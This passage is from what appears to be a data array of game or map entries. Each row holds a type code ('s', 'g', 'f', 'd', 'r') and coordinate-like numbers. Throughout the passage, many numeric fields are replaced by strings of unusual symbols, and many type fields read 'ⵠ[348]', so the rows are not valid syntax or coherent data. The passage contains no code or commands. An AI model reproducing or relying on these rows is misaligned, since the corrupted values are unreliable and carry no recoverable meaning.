			[ⵠΔΔ, "s", Δⵠᐃ, ⲆⵠΔⲆⲆⵠⲆ, 144, 1],
			[1, "s", ᐃⵠΔ, 9, 109, ΔΔΔ],
			[ⵠΔⲆ, "s", ᐃⵠⲆ, 35, 101, ⵠⲆΔ],
			[1, "s", 0, 47, 109, 1],
			[1, "s", ᐃⵠⲆ, 58, 111, 1],
			[1, "s", 0, 84, 110, 1],
			[1, "s", ⵠⲆⲆ, 28, 114, Ⲇᐃⵠ],
			[1, "s", ⵠⲆΔ, 30, 116, ᐃᐃⵠ],
			[1, "s", 1, 46, 112, ⵠⲆΔ],
			[1, "s", 1, 81, 111, Ⲇᐃⵠ],
			[1, "s", 1, 70, 123, 1],
			[ⵠΔΔ, "s", 1, 49, 127, ⵠΔᐃ],
			[Ⲇᐃⵠ, "s", ΔΔΔ, 66, 134, 1],
			[ᐃⲆᐃ, "s", 1, 67, 144, ⵠΔΔ],
			[1, "s", ⵠⲆΔ, 38, 152, 1],
			[ΔΔΔ, "s", 1, 21, 164, ⵠΔΔ],
			[ⵠΔΔ, "s", ᐃⲆᐃ, ⵠⲆᐃᐃⲆ, 147, 1],
			[ΔⲆⵠ, "s", 1, 24, 130, ⵠΔⲆ],
			[ΔΔΔ, "s", 1, 12, 125, Ⲇᐃⵠ],
			[ⵠΔᐃ, "s", ΔΔΔ, 65, 158, 1],
			[ⵠΔⲆ, "s", ᐃⲆᐃ, 83, 167, ⵠΔⲆ],
			[ⵠⲆΔ, "s", ⵠΔΔ, 65, 167, 1],
			[1, "s", 1, 47, 164, 1],
			[ΔΔΔ, "s", ⵠΔⲆ, 56, 168, ⵠΔΔ],
			[1, "s", 2, 54, 169, 1],
			[1, "s", ᐃⲆΔⲆ, 88, 170, ΔⲆⵠ],
			[1, "s", 2, 91, 162, ⵠΔⲆ],
			[1, "s", ᐃⲆⵠᐃ, 79, 149, 1],
			[ΔΔΔ, "s", ᐃⲆΔⲆ, 75, 144, 1],
			[ΔΔΔ, "s", ⲆᐃᐃⲆ, 57, 150, 1],
			[ⵠΔᐃ, "s", 2, 47, 143, ⵠΔᐃ],
			[1, "s", 2, 31, 145, 1],
			[ᐃⲆᐃ, "s", ᐃⲆΔⲆ, 36, 138, 1],
			[ⵠΔΔ, "s", ᐃⲆⵠᐃ, ⵠⲆⲆᐃⵠ, 163, ⵠΔⲆ],
			[ᐃⲆᐃ, "s", 2, 22, 142, 1],
			[1, "g", 2, 78, 132, 1],
			[1, "g", ᐃᐃⵠ, 48, 135, 1],
			[1, "g", ᐃⲆΔⲆ, ΔΔᐃᐃⲆ, 136, 1],
			[Ⲇᐃⵠ, "g", ΔⲆⲆ, 62, 92, ᐃⲆᐃ],
			[1, "g", 2, 70, 80, 1],
			[ⵠΔⲆ, "g", ΔⵠᐃⲆ, 15, 86, ᐃⲆᐃ],
			[ᐃⲆᐃ, "g", ⵠⵠΔⲆ, 47, 75, Ⲇᐃⵠ],
			[ΔⲆⵠ, "g", 2, 36, 89, ΔΔΔ],
			[1, "g", ⲆⲆΔᐃ, 80, 90, 1],
			[1, "f", 1, 39, 118, ΔΔΔ],
			[ⵠΔᐃ, "d", ᐃⲆⵠᐃ, 84, 54, 1],
			[ᐃᐃⵠ, "d", 2, 16, 54, 1],
			[1, ⵠ[348], ⲆᐃᐃᐃΔ, ⵠᐃᐃΔⲆ, 13, ΔⲆⲆ],
			[1, ⵠ[348], 5, ΔΔᐃᐃⲆ, 28, 0],
			[1, ⵠ[348], 5, 9, 25, ᐃⵠⲆ],
			[1, ⵠ[348], 5, 34, 41, 0],
			[Ⲇᐃⵠ, ⵠ[348], ⵠΔᐃΔ, 28, 40, ᐃⵠⲆ],
			[1, ⵠ[348], ⲆᐃⲆᐃ, 31, 47, 0],
			[1, ⵠ[348], 6, ⲆΔⵠᐃⲆ, 39, 0],
			[ΔΔΔ, ⵠ[348], 4, ΔΔᐃᐃΔ, 47, 0],
			[1, ⵠ[348], 4, 7, 46, 0],
			[1, ⵠ[348], ᐃⲆⲆⲆ, ᐃΔⲆΔᐃ, 33, ΔΔⵠ],
			[1, ⵠ[348], 6, 40, 42, 0],
			[ΔⲆⵠ, ⵠ[348], 7, 20, 48, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], ⲆᐃᐃᐃΔ, 29, 59, 0],
			[ⵠΔᐃ, ⵠ[348], 6, 27, 58, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], 6, 15, 54, 0],
			[ΔⲆⵠ, ⵠ[348], ⲆΔΔᐃ, 12, 66, 0],
			[1, ⵠ[348], 5, 37, 53, ᐃⵠΔ],
			[1, ⵠ[348], ᐃⵠⵠΔ, ⲆⵠΔΔᐃ, 63, 0],
			[1, ⵠ[348], 7, 49, 48, ᐃⵠⲆ],
			[1, ⵠ[348], ⲆᐃᐃᐃΔ, 37, 63, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 6, 33, 68, 0],
			[1, ⵠ[348], ⲆᐃⲆᐃ, 56, 52, ᐃΔΔ],
			[1, ⵠ[348], 5, 59, 58, ᐃⵠΔ],
			[1, ⵠ[348], 6, 48, 58, 0],
			[ᐃᐃⵠ, ⵠ[348], ⵠΔᐃΔ, 53, 63, 0],
			[1, ⵠ[348], ᐃⵠⵠΔ, 67, 44, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 5, 70, 49, 0],
			[ᐃᐃⵠ, ⵠ[348], ΔΔᐃⲆ, 82, 55, ⲆΔⵠ],
			[1, ⵠ[348], 5, 79, 41, 0],
			[ⵠΔΔ, ⵠ[348], 5, 91, 29, 0],
			[1, ⵠ[348], 7, 91, 43, 0],
			[1, ⵠ[348], ⵠΔᐃΔⲆ, 85, 44, 0],
			[Ⲇᐃⵠ, ⵠ[348], ⵠᐃΔⵠⲆ, 74, 60, 0],
			[1, ⵠ[348], 6, 90, 8, 0],
			[1, ⵠ[348], ΔΔᐃⲆ, 91, 15, ΔⲆⲆ],
			[1, ⵠ[348], 4, 87, 20, ᐃΔΔ],
			[1, ⵠ[348], ᐃΔⲆΔᐃ, 93, 11, ᐃⵠⲆ],
			[1, ⵠ[348], 6, 91, 21, ⵠⲆⲆ],
			[ΔⲆⵠ, ⵠ[348], ⲆΔᐃΔⵠ, 85, 35, 0],
			[ᐃᐃⵠ, ⵠ[348], ⲆΔΔᐃ, 93, 58, ΔΔⵠ],
			[1, ⵠ[348], ᐃΔΔⲆ, 87, 63, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[348], 7, 77, 62, Δⵠᐃ],
			[ⵠΔΔ, ⵠ[348], 6, 68, 61, 0],
			[ⵠΔⲆ, ⵠ[348], ᐃⲆⵠⵠ, 90, 73, 0],
			[ⵠΔⲆ, ⵠ[348], ⵠⲆⵠᐃ, 87, 71, ᐃⵠⲆ],
			[1, ⵠ[348], 7, 80, 71, 0],
			[ΔΔΔ, ⵠ[348], 7, 83, 77, 0],
			[1, ⵠ[348], ᐃⲆⲆᐃᐃ, 89, 83, ⵠⲆⲆ],
			[1, ⵠ[348], 4, 71, 80, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[348], ⵠⲆⵠᐃ, 71, 70, 0],
			[ᐃᐃⵠ, ⵠ[348], ΔΔᐃⲆ, 63, 72, Δⵠᐃ],
			[1, ⵠ[348], ⲆⵠΔⵠ, 54, 75, ᐃⵠΔ],
			[1, ⵠ[348], 5, 44, 83, ΔΔⵠ],
			[1, ⵠ[348], ᐃΔΔΔ, 42, 74, 0],
			[ⵠΔᐃ, ⵠ[348], 5, ⵠⵠΔⵠᐃ, 81, 0],
			[ⵠΔΔ, ⵠ[348], Ⲇᐃⵠᐃ, 29, 80, 0],
			[ⵠΔᐃ, ⵠ[348], 4, 37, 90, 0],
			[Ⲇᐃⵠ, ⵠ[348], ⵠᐃΔΔ, 7, 75, 0],
			[1, ⵠ[348], ⲆΔᐃΔⵠ, 22, 74, ΔⲆⲆ],
			[1, ⵠ[348], 6, 43, 95, ΔⲆⲆ],
			[ⵠΔⲆ, ⵠ[348], 6, 57, 85, 0],
			[ⵠⲆΔ, ⵠ[348], 6, ⲆⲆⵠΔⵠ, 94, Δⵠᐃ],
			[1, ⵠ[348], 6, ⵠᐃΔⵠΔ, 92, ⲆΔⵠ],
			[ⵠΔᐃ, ⵠ[348], 5, 26, 89, 0],
			[1, ⵠ[348], ΔΔᐃⲆ, 31, 112, ᐃΔΔ],
			[ΔⲆⵠ, ⵠ[348], ⵠⵠΔΔ, 54, 108, ⲆΔⵠ],
			[ⵠΔᐃ, ⵠ[348], ΔⵠⲆⲆ, 55, 95, ⵠⲆⲆ],
			[ΔⲆⵠ, ⵠ[348], 5, 35, 104, ᐃⵠΔ],
			[1, ⵠ[348], 5, 13, 110, 0],
			[Ⲇᐃⵠ, ⵠ[348], ΔⲆΔᐃᐃ, 27, 107, 0],
			[ᐃⲆᐃ, ⵠ[348], ᐃᐃᐃⵠᐃ, 47, 99, Δⵠᐃ],
			[1, ⵠ[348], 7, 11, 104, 0],
			[1, ⵠ[348], 7, 9, 111, Δⵠᐃ],
			[ⵠΔΔ, ⵠ[348], 7, 40, 114, ⵠⲆⲆ],
			[ΔⲆⵠ, ⵠ[348], ᐃⵠⵠᐃᐃ, 28, 117, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], ⵠⵠⲆⲆⵠ, 47, 113, ΔΔⵠ],
			[ΔⲆⵠ, ⵠ[348], ΔⲆΔᐃᐃ, 63, 104, 0],
			[ΔⲆⵠ, ⵠ[348], ⵠᐃᐃⲆ, 64, 92, 0],
			[ⵠΔᐃ, ⵠ[348], ⵠΔᐃΔⲆ, 86, 97, 0],
			[ᐃⲆᐃ, ⵠ[348], ΔⵠⲆⲆ, 76, 91, ΔΔⵠ],
			[ΔΔΔ, ⵠ[348], ⵠᐃΔⵠ, 85, 86, ᐃΔΔ],
			[1, ⵠ[348], 6, 78, 83, 0],
			[Ⲇᐃⵠ, ⵠ[348], 6, 71, 97, Δⵠᐃ],
			[1, ⵠ[348], ⵠΔᐃΔ, 69, 105, 0],
			[ΔΔΔ, ⵠ[348], ⵠᐃᐃⲆ, 79, 104, ⲆΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], 4, 86, 109, 0],
			[1, ⵠ[348], ⲆⵠΔⵠ, 86, 118, 0],
			[ΔΔΔ, ⵠ[348], ΔⵠⲆⲆ, 70, 113, ᐃⵠⲆ],
			[ⵠΔⲆ, ⵠ[348], 6, 69, 121, 0],
			[ⵠΔⲆ, ⵠ[348], ⵠᐃΔⵠⲆ, 76, 122, 0],
			[1, ⵠ[348], 7, 87, 130, 0],
			[1, ⵠ[348], Ⲇⵠⵠⵠ, 84, 123, Δⵠᐃ],
			[ΔΔΔ, ⵠ[348], 4, 57, 121, ⲆΔⵠ],
			[1, ⵠ[348], 5, 53, 125, 0],
			[Ⲇᐃⵠ, ⵠ[348], 5, 62, 131, 0],
			[1, ⵠ[348], ⵠᐃᐃΔ, 67, 143, ᐃΔΔ],
			[ⵠΔⲆ, ⵠ[348], 5, 77, 143, 0],
			[1, ⵠ[348], ᐃΔΔⲆ, 85, 136, 0],
			[1, ⵠ[348], 6, 87, 147, 0],
			[ΔΔΔ, ⵠ[348], ⲆᐃⲆᐃ, 92, 140, ᐃΔΔ],
			[ΔⲆⵠ, ⵠ[348], 4, 93, 127, ᐃΔΔ],
			[1, ⵠ[348], ᐃⲆⵠⵠ, 93, 106, 0],
			[Ⲇᐃⵠ, ⵠ[348], 5, 45, 144, ΔⲆⲆ],
			[1, ⵠ[348], 4, 41, 139, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], Ⲇⵠⵠⵠ, 54, 138, ᐃⵠΔ],
			[1, ⵠ[348], 6, 29, 145, ⵠⲆⲆ],
			[1, ⵠ[348], ⲆᐃⲆᐃ, 29, 132, 0],
			[Ⲇᐃⵠ, ⵠ[348], 6, 35, 127, Δⵠᐃ],
			[ⵠΔⲆ, ⵠ[348], 6, 64, 142, 0],
			[ⵠⲆΔ, ⵠ[348], 5, 23, 131, ⵠⲆⲆ],
			[1, ⵠ[348], ᐃΔΔⲆ, 9, 134, 0],
			[1, ⵠ[348], 6, 11, 121, 0],
			[1, ⵠ[348], 4, 26, 121, ⵠⲆⲆ],
			[1, ⵠ[348], 35, 58, 150, ᐃΔΔ],
			[1, ⵠ[348], 33, 48, 156, ᐃⵠΔ],
			[1, ⵠ[348], 33, 25, 158, ΔⲆⲆ],
			[ΔⲆⵠ, ⵠ[348], 33, 36, 154, ΔⲆⲆ],
			[1, ⵠ[348], 34, 9, 154, ᐃⵠⲆ],
			[1, ⵠ[348], 34, ᐃⲆⵠᐃⲆ, 148, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[348], 34, 21, 142, 0],
			[1, ⵠ[348], 34, 38, 139, 0],
			[ᐃᐃⵠ, ⵠ[348], 34, 47, 144, Δⵠᐃ],
			[ᐃᐃⵠ, ⵠ[348], 34, 68, 142, 0],
			[ΔⲆⵠ, ⵠ[348], 36, 70, 135, 0],
			[ΔⲆⵠ, ⵠ[348], 36, 64, 132, 0],
			[ⵠΔᐃ, ⵠ[348], 36, 86, 134, 0],
			[ⵠⲆΔ, ⵠ[348], 36, 90, 141, 0],
			[1, ⵠ[348], 36, 93, 131, 0],
			[ⵠΔⲆ, ⵠ[348], 36, 91, 125, ⵠⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 36, 76, 123, Δⵠᐃ],
			[ΔⲆⵠ, ⵠ[348], 33, 82, 122, ΔΔⵠ],
			[ΔΔΔ, ⵠ[348], 35, 56, 122, 0],
			[1, ⵠ[348], 35, 40, 119, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 35, 17, 112, ᐃⵠⲆ],
			[ⵠΔᐃ, ⵠ[348], 35, 37, 102, 0],
			[ⵠΔⲆ, ⵠ[348], 33, ᐃΔΔⵠᐃ, 97, ᐃⵠΔ],
			[1, ⵠ[348], 34, 10, 83, ⵠⲆⲆ],
			[ⵠⲆΔ, ⵠ[348], 33, 19, 73, ⵠⲆⲆ],
			[1, ⵠ[348], 33, 10, 60, 0],
			[1, ⵠ[348], 35, 24, 60, 0],
			[ΔΔΔ, ⵠ[348], 36, ⵠⵠⵠᐃᐃ, 45, ᐃⵠⲆ],
			[ⵠΔΔ, ⵠ[348], 36, 21, 42, Δⵠᐃ],
			[1, ⵠ[348], 35, Δᐃⵠⵠⵠ, 32, 0],
			[ᐃⲆᐃ, ⵠ[348], 33, ΔΔⵠⲆⵠ, 24, 0],
			[1, ⵠ[348], 35, 35, 27, Δⵠᐃ],
			[ᐃᐃⵠ, ⵠ[348], 33, 56, 35, 0],
			[ᐃⲆᐃ, ⵠ[348], 36, 53, 36, ΔΔⵠ],
			[1, ⵠ[348], 33, 45, 35, ᐃΔΔ],
			[ΔⲆⵠ, ⵠ[348], 35, 53, 39, ΔⲆⲆ],
			[1, ⵠ[348], 36, 57, 30, 0],
			[1, ⵠ[348], 33, 86, 108, ⲆΔⵠ],
			[1, ⵠ[348], 33, 68, 112, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 33, 49, 109, Δⵠᐃ],
			[ΔΔΔ, ⵠ[348], 33, 46, 95, ⵠⲆⲆ],
			[1, ⵠ[348], 33, 90, 76, 0],
			[1, ⵠ[348], 36, 76, 83, 0],
			[ᐃⲆᐃ, ⵠ[348], 36, 70, 72, ᐃΔΔ],
			[ⵠⲆΔ, ⵠ[348], 36, 78, 63, ᐃⵠΔ],
			[1, ⵠ[348], 36, 90, 64, Δⵠᐃ],
			[1, ⵠ[348], 36, 60, 70, 0],
			[ⵠⲆΔ, ⵠ[348], 35, 75, 90, 0],
			[1, ⵠ[348], 35, 81, 58, 0],
			[1, ⵠ[348], 35, 91, 51, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], 35, 93, 56, 0],
			[ΔⲆⵠ, ⵠ[348], 35, 61, 60, 0],
			[1, ⵠ[348], 35, 66, 46, ⵠⲆⲆ],
			[1, ⵠ[348], 33, 90, ⲆⲆⲆⵠᐃ, 0],
			[1, ⵠ[348], 34, 92, Ⲇᐃⵠⵠⵠ, 0],
			[1, ⵠ[348], 35, 75, 39, 0],
			[1, ⵠ[348], 35, 67, 42, ΔΔⵠ],
			[ⵠⲆΔ, ⵠ[348], 35, 93, 37, ΔΔⵠ],
			[1, ⵠ[348], 36, 89, 28, 0],
			[Ⲇᐃⵠ, ⵠ[348], 36, 42, 61, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 33, 49, 50, Δⵠᐃ],
			[1, ⵠ[348], 33, 44, 75, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 33, 46, 85, 0],
			[ᐃᐃⵠ, ⵠ[348], 33, 64, 84, 0],
			[ⵠΔᐃ, ⵠ[348], 33, 56, 94, ΔⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 33, 25, 90, 0],
			[1, ⵠ[348], 33, 31, 69, ᐃⵠΔ],
			[ⵠⲆΔ, ⵠ[348], 35, 34, 54, ⲆΔⵠ],
			[1, ⵠ[348], 35, 29, 47, 0],
			[ΔⲆⵠ, ⵠ[348], 36, 42, 41, 0],
			[1, ⵠ[348], 36, 29, 34, ᐃⵠΔ],
			[1, ⵠ[348], 35, 20, 55, 0],
			[ᐃᐃⵠ, ⵠ[348], 35, 14, 52, 0],
			[1, "s", ᐃⲆⵠᐃ, 12, 171, 1],
			[ᐃⲆᐃ, "r", 20, 188, 0],
			[ⵠΔⲆ, "r", 21, 188, ⵠⲆⲆ],
			[ⵠΔⲆ, "r", 22, 188, ᐃⵠΔ],
			[ΔΔΔ, "r", 23, 188, 0],
			[Ⲇᐃⵠ, "r", 24, 188, 0],
			[1, "r", 25, 189, 0],
			[ⵠⲆΔ, "r", 24, 189, 0],
			[1, "r", 23, 189, ᐃⵠΔ],
			[ΔΔΔ, "r", 22, 189, ᐃⵠΔ],
			[1, "r", 21, 189, 0],
			[ⵠΔΔ, "r", 20, 189, 0],
			[1, "r", ΔΔΔΔⲆ, 189, 0],
			[ⵠΔΔ, "r", ⲆⲆⵠΔⵠ, 190, ᐃⵠΔ],
			[1, "r", 19, 191, 0],
			[ⵠΔᐃ, "r", ᐃΔⲆⵠᐃ, 191, 0],
			[1, "r", 21, 191, ΔΔⵠ],
			[ᐃᐃⵠ, "r", 22, 191, 0],
			[1, "r", 24, 191, 0],
			[ᐃⲆᐃ, "r", 23, 191, 0],
			[ΔⲆⵠ, "r", 25, 191, 0],
			[1, "r", 25, 190, 0],
			[ⵠΔᐃ, "r", 24, 190, 0],
			[1, "r", 23, 190, 0],
			[1, "r", 22, 190, ⵠⲆⲆ],
			[ⵠΔᐃ, "r", 21, 190, 0],
			[1, "r", ⵠⵠⵠⲆᐃ, 190, ΔⲆⲆ],
			[1, "r", 26, 190, ΔΔⵠ],
			[1, "r", 26, 191, ᐃΔΔ],
			[ⵠΔⲆ, "r", 24, 193, 0],
			[ΔΔΔ, "r", 23, 193, 0],
			[1, "r", 22, 193, 0],
			[1, "r", ΔᐃⲆⵠᐃ, 192, 0],
			[ⵠΔΔ, "r", 21, 192, ᐃⵠΔ],
			[ΔΔΔ, "r", 22, 192, ᐃΔΔ],
			[ⵠⲆΔ, "r", 23, 192, ᐃⵠΔ],
			[1, "r", 24, 192, ΔⲆⲆ],
			[1, "r", 25, 192, 0],
			[1, "r", 53, 199, 0],
			[ⵠΔᐃ, "r", 52, 200, 0],
			[ᐃⲆᐃ, "r", 54, 199, 0],
			[1, "r", 55, 199, 0],
			[1, "r", 55, 200, ᐃⵠⲆ],
			[ᐃⲆᐃ, "r", 54, 200, 0],
			[1, "r", 53, 200, 0],
			[1, "r", 51, 200, ⵠⲆⲆ],
			[1, "r", 56, 200, 0],
			[1, "r", 55, 201, Δⵠᐃ],
			[1, "r", 54, 201, 0],
			[1, "r", 55, 202, ⵠⲆⲆ],
			[ΔⲆⵠ, "r", 54, 203, ᐃⵠⲆ],
			[1, "r", 54, 204, 0],
			[ᐃᐃⵠ, "r", 54, 202, ᐃΔΔ],
			[1, "r", 53, 202, 0],
			[ⵠΔΔ, "r", 52, 202, 0],
			[1, "r", 53, 201, ΔΔⵠ],
			[1, "r", 52, 201, ᐃⵠⲆ],
			[1, "r", 51, 201, 0],
			[ⵠⲆΔ, "r", 51, 202, 0],
			[1, "r", 50, 202, 0],
			[ⵠΔⲆ, "r", 50, 201, 0],
			[ⵠΔⲆ, "r", 56, 201, 0],
			[1, "r", 53, 203, 0],
			[ᐃⲆᐃ, "r", 52, 203, ⲆΔⵠ],
			[ᐃⲆᐃ, "r", 51, 203, 0],
			[ΔΔΔ, "r", 56, 202, Δⵠᐃ],
			[1, "r", 55, 203, 0],
			[ᐃⲆᐃ, "r", 53, 204, ᐃⵠΔ],
			[1, "r", 52, 204, ᐃⵠΔ],
			[ⵠΔⲆ, "r", 55, 204, 0],
			[ΔⲆⵠ, "r", 56, 203, ⲆΔⵠ],
			[1, "r", 56, 244, ᐃⵠⲆ],
			[ΔΔΔ, "r", 54, 246, 0],
			[ᐃᐃⵠ, "r", 50, 248, 0],
			[Ⲇᐃⵠ, "r", 48, 248, 0],
			[ΔΔΔ, "r", 43, 248, ⲆΔⵠ],
			[1, "r", 45, 238, ⵠⲆⲆ],
			[ⵠΔᐃ, "r", 44, 238, Δⵠᐃ],
			[ⵠΔᐃ, "r", 43, 238, ΔΔⵠ],
			[1, "r", 46, 238, ᐃⵠΔ],
			[1, "r", 47, 238, ΔΔⵠ],
			[ᐃᐃⵠ, "r", 48, 238, 0],
			[1, "r", 49, 238, 0],
			[1, "r", 50, 238, 0],
			[ⵠΔⲆ, "r", 51, 238, 0],
			[ⵠΔⲆ, "r", 52, 238, ΔⲆⲆ],
			[1, "r", 53, 238, 0],
			[ᐃⲆᐃ, "r", 54, 239, ᐃⵠΔ],
			[ΔⲆⵠ, "r", 53, 240, ⵠⲆⲆ],
			[ⵠⲆΔ, "r", 53, 239, 0],
			[1, "r", 52, 239, 0],
			[ⵠΔᐃ, "r", 51, 239, ᐃⵠΔ],
			[ᐃⲆᐃ, "r", 50, 239, 0],
			[1, "r", 49, 239, ᐃⵠΔ],
			[1, "r", 48, 239, ᐃⵠΔ],
			[ᐃⲆᐃ, "r", 47, 239, ᐃΔΔ],
			[1, "r", 46, 239, 0],
			[ⵠΔᐃ, "r", 45, 239, ⲆΔⵠ],
			[ⵠΔᐃ, "r", 44, 239, 0],
			[ᐃᐃⵠ, "r", 43, 239, 0],
			[1, "r", 42, 239, ᐃⵠⲆ],
			[ΔΔΔ, "r", 41, 240, 0],
			[ΔⲆⵠ, "r", 42, 240, 0],
			[1, "r", 43, 240, ΔΔⵠ],
			[1, "r", 44, 240, 0],
			[1, "r", 45, 240, 0],
			[1, "r", 46, 240, ᐃⵠΔ],
			[ᐃⲆᐃ, "r", 47, 240, 0],
			[ⵠⲆΔ, "r", 48, 240, Δⵠᐃ],
			[1, "r", 49, 240, 0],
			[ⵠΔΔ, "r", 50, 240, ᐃⵠΔ],
			[ᐃⲆᐃ, "r", 51, 240, Δⵠᐃ],
			[Ⲇᐃⵠ, "r", 52, 240, 0],
			[ⵠΔᐃ, "r", 54, 240, ᐃΔΔ],
			[1, "r", 55, 240, 0],
			[ΔΔΔ, "r", 56, 241, 0],
			[ⵠⲆΔ, "r", 55, 241, ᐃⵠΔ],
			[1, "r", 54, 241, ΔⲆⲆ],
			[ⵠΔⲆ, "r", 53, 241, ᐃⵠⲆ],
			[ⵠⲆΔ, "r", 52, 241, ⵠⲆⲆ],
			[Ⲇᐃⵠ, "r", 51, 241, ᐃⵠⲆ],
			[1, "r", 49, 241, ᐃΔΔ],
			[1, "r", 50, 241, 0],
			[Ⲇᐃⵠ, "r", 48, 241, ᐃΔΔ],
			[ΔΔΔ, "r", 47, 241, ᐃΔΔ],
			[1, "r", 46, 241, 0],
			[1, "r", 45, 241, 0],
			[1, "r", 44, 241, 0],
			[ⵠⲆΔ, "r", 43, 241, ⵠⲆⲆ],
			[ⵠⲆΔ, "r", 42, 241, 0],
			[ⵠΔᐃ, "r", 41, 241, ᐃΔΔ],
			[ᐃⲆᐃ, "r", 40, 242, ᐃⵠⲆ],
			[1, "r", 41, 242, 0],
			[1, "r", 42, 242, ΔΔⵠ],
			[Ⲇᐃⵠ, "r", 43, 242, ⵠⲆⲆ],
			[1, "r", 44, 242, 0],
			[1, "r", 45, 242, 0],
			[1, "r", 46, 242, ΔⲆⲆ],
			[ⵠΔᐃ, "r", 47, 242, 0],
			[1, "r", 48, 242, 0],
			[ΔΔΔ, "r", 49, 242, ᐃΔΔ],
			[1, "r", 50, 242, ΔΔⵠ],
			[1, "r", 51, 242, 0],
			[ⵠΔΔ, "r", 52, 242, ΔΔⵠ],
			[1, "r", 53, 242, ⵠⲆⲆ],
			[1, "r", 54, 242, ⵠⲆⲆ],
			[1, "r", 55, 242, ΔΔⵠ],
			[1, "r", 56, 242, ⵠⲆⲆ],
			[ᐃⲆᐃ, "r", 56, 243, ⵠⲆⲆ],
			[1, "r", 55, 243, 0],
			[ⵠΔΔ, "r", 54, 243, 0],
			[ⵠΔⲆ, "r", 53, 243, 0],
			[1, "r", 52, 243, 0],
			[1, "r", 51, 243, 0],
			[Ⲇᐃⵠ, "r", 50, 243, ⲆΔⵠ],
			[ⵠΔΔ, "r", 49, 243, ΔⲆⲆ],
			[ⵠⲆΔ, "r", 48, 243, 0],
			[1, "r", 47, 243, 0],
			[1, "r", 46, 243, ⲆΔⵠ],
			[ΔⲆⵠ, "r", 45, 243, 0],
			[ⵠΔⲆ, "r", 44, 243, 0],
			[ᐃᐃⵠ, "r", 43, 243, 0],
			[ⵠΔⲆ, "r", 42, 243, 0],
			[1, "r", 41, 243, 0],
			[ΔΔΔ, "r", 40, 243, ᐃΔΔ],
			[1, "r", 40, 244, 0],
			[ⵠⲆΔ, "r", 41, 244, ᐃⵠΔ],
			[1, "r", 43, 244, Δⵠᐃ],
			[ⵠⲆΔ, "r", 44, 244, Δⵠᐃ],
			[1, "r", 45, 244, 0],
			[ⵠΔΔ, "r", 46, 244, ᐃⵠΔ],
			[1, "r", 47, 244, 0],
			[Ⲇᐃⵠ, "r", 48, 244, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "r", 49, 244, ᐃⵠΔ],
			[ⵠΔᐃ, "r", 50, 244, ΔⲆⲆ],
			[Ⲇᐃⵠ, "r", 51, 244, 0],
			[1, "r", 52, 244, 0],
			[ᐃᐃⵠ, "r", 53, 244, ᐃΔΔ],
			[ᐃᐃⵠ, "r", 54, 244, ΔΔⵠ],
			[ⵠΔᐃ, "r", 55, 244, 0],
			[ⵠΔⲆ, "r", 42, 244, ΔⲆⲆ],
			[1, "r", 40, 245, ⵠⲆⲆ],
			[1, "r", 41, 245, 0],
			[ᐃⲆᐃ, "r", 42, 245, 0],
			[Ⲇᐃⵠ, "r", 43, 245, ⵠⲆⲆ],
			[ⵠⲆΔ, "r", 44, 245, 0],
			[1, "r", 45, 245, 0],
			[ΔⲆⵠ, "r", 46, 245, 0],
			[1, "r", 47, 245, 0],
			[Ⲇᐃⵠ, "r", 48, 245, ΔⲆⲆ],
			[ⵠΔᐃ, "r", 49, 245, 0],
			[ⵠΔΔ, "r", 50, 245, 0],
			[ⵠΔᐃ, "r", 51, 245, 0],
			[1, "r", 52, 246, 0],
			[1, "r", 52, 245, ᐃΔΔ],
			[1, "r", 53, 245, 0],
			[1, "r", 54, 245, 0],
			[1, "r", 55, 245, 0],
			[1, "r", 53, 246, 0],
			[1, "r", 51, 246, 0],
			[ᐃⲆᐃ, "r", 50, 246, 0],
			[1, "r", 49, 246, ᐃⵠΔ],
			[1, "r", 48, 246, ΔΔⵠ],
			[1, "r", 47, 246, ᐃⵠⲆ],
			[1, "r", 45, 246, ΔⲆⲆ],
			[ⵠΔⲆ, "r", 46, 246, ᐃⵠΔ],
			[1, "r", 44, 246, 0],
			[1, "r", 43, 246, 0],
			[1, "r", 42, 246, 0],
			[ⵠΔΔ, "r", 41, 246, 0],
			[ᐃᐃⵠ, "r", 42, 247, Δⵠᐃ],
			[1, "r", 43, 247, 0],
			[1, "r", 44, 247, ᐃⵠⲆ],
			[1, "r", 45, 247, 0],
			[1, "r", 46, 247, ᐃⵠΔ],
			[ⵠΔⲆ, "r", 47, 247, 0],
			[1, "r", 48, 247, ᐃⵠⲆ],
			[ⵠΔΔ, "r", 50, 247, 0],
			[ⵠΔⲆ, "r", 51, 247, 0],
			[ᐃᐃⵠ, "r", 52, 247, 0],
			[ⵠΔᐃ, "r", 53, 247, 0],
			[ΔⲆⵠ, "r", 54, 247, Δⵠᐃ],
			[Ⲇᐃⵠ, "r", 49, 247, 0],
			[ⵠΔΔ, "r", 49, 248, 0],
			[ᐃᐃⵠ, "r", 47, 248, ΔⲆⲆ],
			[1, "r", 46, 248, ΔΔⵠ],
			[ᐃᐃⵠ, "r", 45, 248, 0],
			[ᐃᐃⵠ, "r", 51, 248, 0],
			[ⵠΔᐃ, "r", 55, 246, ΔΔΔ],
			[1, "r", 55, 247, ΔΔΔ],
			[ΔⲆⵠ, "r", 56, 247, 1],
			[1, "r", 56, 248, 1],
			[1, "r", 95, 270, ⵠΔΔ],
			[ⵠΔᐃ, "r", 93, 270, 1],
			[ᐃᐃⵠ, "r", 94, 270, 1],
			[ⵠΔⲆ, "r", 95, 271, 1],
			[ⵠΔᐃ, "r", 94, 271, 1],
			[1, "r", 93, 271, ΔΔΔ],
			[1, "r", 94, 282, 1],
			[ⵠΔᐃ, "r", 93, 282, ⵠⲆΔ],
			[1, "r", 93, 281, 1],
			[ⵠΔⲆ, "r", 92, 281, 1],
